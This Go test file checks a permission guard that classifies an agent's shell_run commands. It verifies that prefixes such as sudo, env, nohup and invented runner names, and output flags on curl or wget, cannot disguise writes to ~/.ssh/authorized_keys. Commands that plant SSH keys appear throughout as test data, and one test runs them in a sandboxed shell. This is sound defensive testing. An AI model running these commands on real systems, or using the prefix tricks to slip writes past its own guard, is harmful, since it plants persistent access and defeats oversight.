package guard

import (
	"os"
	"path/filepath"
	"runtime"
	"testing"
)

// argvwrite_test.go holds the assertions the corpus cannot carry: the ones whose
// PREMISE is that a name appears in no table of this package. A corpus row can
// pin the verdict of `zzrunner-nobody-knows tee -a …`, but only a test that
// asserts the premise next to the verdict proves the reading is structural
// rather than a row somebody added.

// writeProbeProfile is the corpus profile: it says yes to everything a profile
// can say yes to, so the only refusal a row can produce comes from a dimension
// that does not consult it — here, the built-in credential denylist inside
// checkFS.
func writeProbeProfile() PermissionProfile { return probeProfile() }

// invented names, deliberately absent from every table in this package. The
// premise is ASSERTED below rather than assumed.
const (
	inventedRunner = "zzrunner-nobody-knows"
	inventedFetch  = "zzfetch-nobody-here-runs"
)

// TestWriteDimensionIsNotDecidedByTheProgramNameInFront is the structural claim
// of segmentWriteTargets, stated as an experiment rather than as prose.
//
// Before it, checkSegmentWrites looked up the segment's FIRST program word in
// argvWriters and stopped. Every prefix runner in this package's own
// prefixRunners table — and every runner NOT in it, invented ones included —
// therefore removed the FS write dimension outright: `tee -a
// ~/.ssh/authorized_keys` prompted and `sudo tee -a ~/.ssh/authorized_keys` was
// Allow, as were 16 more spellings.
//
// The invented rows are the whole point. A fix that walked prefixRunners would
// pass every real name here and fail the two invented ones, which is exactly the
// difference between a table and a criterion.
func TestWriteDimensionIsNotDecidedByTheProgramNameInFront(t *testing.T) {
	if homeDir() == "" {
		t.Skip("no HOME/USERPROFILE: the credential target is home-relative")
	}
	if _, known := prefixRunners[inventedRunner]; known {
		t.Fatalf("%q is in prefixRunners; the premise of this test is that it is in no table", inventedRunner)
	}
	if argvWriteTargets(inventedRunner, []string{"x"}) != nil {
		t.Fatalf("%q is in argvWriters; the premise of this test is that it is in no table", inventedRunner)
	}
	g := New()
	prof := writeProbeProfile()
	// The control: the same write with nothing in front of it.
	if got := classOf(g.Check(prof, Action{Tool: "shell_run", Shell: `tee -a ~/.ssh/authorized_keys`, Workdir: segTestWorkdir})); got != wantPrompt {
		t.Fatalf("control `tee -a ~/.ssh/authorized_keys` = %s, want Prompt; the rest of this test is meaningless", got)
	}
	for _, prefix := range []string{
		"sudo", "doas", "pkexec", "env", "nohup", "setsid", "timeout 5", "nice",
		"stdbuf -o0", "busybox", "command", "exec", "xargs", "flock /tmp/lk",
		"unshare", "watch", "runuser -u root --", "taskset -c 0", "chroot /",
		inventedRunner, inventedRunner + " " + inventedFetch,
	} {
		cmd := prefix + " tee -a ~/.ssh/authorized_keys"
		if got := classOf(g.Check(prof, Action{Tool: "shell_run", Shell: cmd, Workdir: segTestWorkdir})); got == wantAllow {
			t.Errorf("Check(%q) = Allow; a prefix in front of a writer erased the FS write dimension", cmd)
		}
	}
}

// TestOutputFlagIsReadWithoutKnowingTheProgram is the other half of the same
// claim, for the shape a suffix walk cannot reach: the path is named by a FLAG
// on the program in front, not by a program behind it.
//
// `curl -o ~/.ssh/authorized_keys url` is the standard spelling of "land the
// network's answer here", and curl was already known to this package (it is in
// nonInterpreterPrograms for `-d`) without anything reading `-o`. The invented
// program is what says the fix is the flag rather than a curl row.
func TestOutputFlagIsReadWithoutKnowingTheProgram(t *testing.T) {
	if homeDir() == "" {
		t.Skip("no HOME/USERPROFILE: the credential target is home-relative")
	}
	if argvWriteTargets(inventedFetch, []string{"-o", "x"}) != nil {
		t.Fatalf("%q is in argvWriters; the premise of this test is that it is in no table", inventedFetch)
	}
	g := New()
	prof := writeProbeProfile()
	for _, cmd := range []string{
		`curl -o ~/.ssh/authorized_keys http://x/k`,
		`curl -sSfL http://x/k -o ~/.ssh/authorized_keys`,
		`curl --output=~/.ssh/authorized_keys http://x/k`,
		`wget -O ~/.ssh/authorized_keys http://x/k`,
		`wget --output-document ~/.ssh/authorized_keys http://x/k`,
		inventedFetch + ` -o ~/.ssh/authorized_keys http://x/k`,
		`sudo ` + inventedFetch + ` --output ~/.ssh/authorized_keys`,
	} {
		if got := classOf(g.Check(prof, Action{Tool: "shell_run", Shell: cmd, Workdir: segTestWorkdir})); got == wantAllow {
			t.Errorf("Check(%q) = Allow; the output flag named a credential path and nothing read it", cmd)
		}
	}
}

// TestOutputFlagSkipsTheOperandShapesThatAreNotPaths is the over-strictness half.
//
// Each row is a measured false positive the skip list exists for, not a
// precaution: `-O` is a SWITCH in curl and an output path in wget, `-o` carries
// settings in ssh and mount, and `-` is stdout. Reading any of them as a write
// would put an FS check — and under a narrow profile a prompt — on ordinary work.
func TestOutputFlagSkipsTheOperandShapesThatAreNotPaths(t *testing.T) {
	for _, tc := range []struct {
		args []string
		why  string
	}{
		{[]string{"-O", "https://example.com/k"}, "curl's -O is a switch; the next word is the URL"},
		{[]string{"-o", "StrictHostKeyChecking=no", "host"}, "ssh -o carries a key=value setting"},
		{[]string{"-o", "rw,noexec=1", "/dev/sda", "/mnt"}, "mount -o carries settings"},
		{[]string{"-o", "-"}, "a bare - is stdout by convention"},
		{[]string{"-o", "--verbose"}, "the next word is another flag, so no path was given"},
		{[]string{"--", "-o", "out.txt"}, "everything after -- is an operand, not a flag"},
	} {
		if got := outputFlagTargets(tc.args); len(got) != 0 {
			t.Errorf("outputFlagTargets(%q) = %q, want none (%s)", tc.args, got, tc.why)
		}
	}
	// And the positive control, or the rows above could be satisfied by a
	// function that always returns nil.
	for _, tc := range []struct {
		args []string
		want string
	}{
		{[]string{"-o", "out.txt", "https://x"}, "out.txt"},
		{[]string{"--output", "/etc/zz.conf"}, "/etc/zz.conf"},
		{[]string{"--output-document=/etc/zz.conf"}, "/etc/zz.conf"},
	} {
		got := outputFlagTargets(tc.args)
		if len(got) != 1 || got[0] != tc.want {
			t.Errorf("outputFlagTargets(%q) = %q, want [%q]", tc.args, got, tc.want)
		}
	}
}

// TestSuffixWriteReadingDoesNotRefuseOrdinarySubcommands is the reverse
// direction, and it is the one that caught the scoping bug.
//
// coreutils' `install` is a real argvWriters entry whose destination is its last
// operand, and `<tool> install <thing>` is how half the package managers on the
// planet spell an installation. Reading the suffix unscoped turned every one of
// them into a write of `<thing>` — and under a profile with shell access but no
// fs.write list, into a refusal. leavesWorkingTree is the scope; this asserts it
// under the profile shape where the difference is observable.
func TestSuffixWriteReadingDoesNotRefuseOrdinarySubcommands(t *testing.T) {
	// Shell permitted, no filesystem writes permitted at all: the profile shape
	// under which a bogus write target is a HardDeny rather than an invisible
	// Allow.
	p := PermissionProfile{
		Tools: ToolsPerm{Allow: []string{"*"}},
		Shell: ShellPerm{Policy: "allowlist", Patterns: []string{"*"}},
	}
	g := New()
	wd := t.TempDir()
	for _, cmd := range []string{
		`sudo apt-get install vim`,
		`apt-get install vim`,
		`brew install jq`,
		`pip install requests`,
		`npm install lodash`,
		`cargo install ripgrep`,
		`go install ./cmd/x`,
		`sudo make install`,
	} {
		if d := g.Check(p, Action{Tool: "shell_run", Shell: cmd, Workdir: wd}); d.Verdict != Allow {
			t.Errorf("Check(%q).Verdict = %v (%s), want Allow: a subcommand word named `install` "+
				"is not a write of its last operand", cmd, d.Verdict, d.Reason)
		}
	}
	// The positive control under the SAME profile: an absolute suffix target is
	// still read, so the scoping did not switch the reading off.
	if d := g.Check(p, Action{Tool: "shell_run", Shell: `sudo install -m 600 /dev/stdin /etc/zz.conf`, Workdir: wd}); d.Verdict == Allow {
		t.Error("Check(sudo install … /etc/zz.conf) = Allow; the suffix reading is off, not scoped")
	}
}

// TestLeavesWorkingTreeIsLexical pins the discriminator itself, because a
// version of it that answered "yes" for everything would make the test above
// pass by refusing nothing and a version that answered "no" for everything would
// make the two above pass by reading nothing.
func TestLeavesWorkingTreeIsLexical(t *testing.T) {
	for _, p := range []string{
		"/etc/passwd", "~/.ssh/authorized_keys", "$HOME/.bashrc", "${HOME}/x",
		`C:\Users\me\x`, `\\server\share\x`, "../outside", `..\outside`,
		"build/../../outside", "..",
	} {
		if !leavesWorkingTree(p) {
			t.Errorf("leavesWorkingTree(%q) = false, want true", p)
		}
	}
	for _, p := range []string{
		"", "vim", "out.txt", "./cmd/x", "build/out.txt", "a..b", "lodash.get", "..hidden",
	} {
		if leavesWorkingTree(p) {
			t.Errorf("leavesWorkingTree(%q) = true, want false", p)
		}
	}
}

// TestRealShellPlantsTheKeyForEveryPrefixedWriteRow is the differential half,
// kept here rather than in the corpus because the invented names have no
// stand-in and the corpus bookkeeping would have to count them as unwitnessed.
//
// It runs the prefixed spellings through a real /bin/sh with the same recorder
// shims the corpus uses and asserts that the ones the shell CAN resolve really
// do create the credential file — so "guard now prompts" is being said about
// commands that would otherwise have planted a key, not about strings.
func TestRealShellPlantsTheKeyForEveryPrefixedWriteRow(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("the reference reading comes from /bin/sh")
	}
	_, run := newShellHarness(t)
	shimsAreLive(t, run)
	home := os.Getenv("HOME")
	if home == "" {
		t.Fatal("newShellHarness did not set HOME; the credential file cannot be witnessed")
	}
	keyPath := filepath.Join(home, ".ssh", "authorized_keys")
	if err := os.MkdirAll(filepath.Dir(keyPath), 0o700); err != nil {
		t.Fatal(err)
	}
	planted := 0
	for _, prefix := range []string{"sudo", "env", "nohup", "command", "xargs", "timeout 5", "pkexec"} {
		if err := os.Remove(keyPath); err != nil && !os.IsNotExist(err) {
			t.Fatal(err)
		}
		cmd := prefix + " tee -a ~/.ssh/authorized_keys"
		run(cmd)
		if _, err := os.Stat(keyPath); err != nil {
			t.Errorf("/bin/sh did not plant the key for %q; the row is not measuring what it claims", cmd)
			continue
		}
		planted++
		if got := classOf(New().Check(writeProbeProfile(), Action{Tool: "shell_run", Shell: cmd, Workdir: segTestWorkdir})); got == wantAllow {
			t.Errorf("/bin/sh planted the credential file for %q and guard says Allow", cmd)
		}
	}
	if planted == 0 {
		t.Fatal("the harness planted nothing; this test is asserting about the empty set")
	}
	if err := os.Remove(keyPath); err != nil && !os.IsNotExist(err) {
		t.Fatal(err)
	}
}
